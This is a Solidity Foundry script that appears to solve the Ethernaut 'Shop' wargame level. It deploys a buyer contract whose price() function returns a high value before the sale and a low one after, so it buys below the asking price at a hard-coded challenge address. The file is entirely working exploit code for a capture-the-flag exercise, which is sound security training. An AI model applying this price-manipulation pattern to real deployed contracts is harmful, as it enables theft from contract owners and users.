
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MyBuyer {

    Shop public shopInstance;
    bool public first_time = true;

    constructor (Shop _shopInstance) {
        shopInstance = _shopInstance;
    }

    function modify() public {
        first_time = false;
    }

    function price() external view returns (uint256) {
        if (!shopInstance.isSold()){
            return 200;
        }
        return 2;
    }

    function buyItem() public {
        shopInstance.buy();
    }
}

contract ShopSolution is Script {

    Shop public shopInstance = Shop(0xAD1e000A9204DDd41d43Cc37C3ecf2900fE84aEA);

    address my_addr = vm.envAddress("PUBLIC_KEY");
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.logBool(shopInstance.isSold());
        MyBuyer b = new MyBuyer(shopInstance);
        b.buyItem();
        console.logBool(shopInstance.isSold());

        vm.stopBroadcast();
    }
}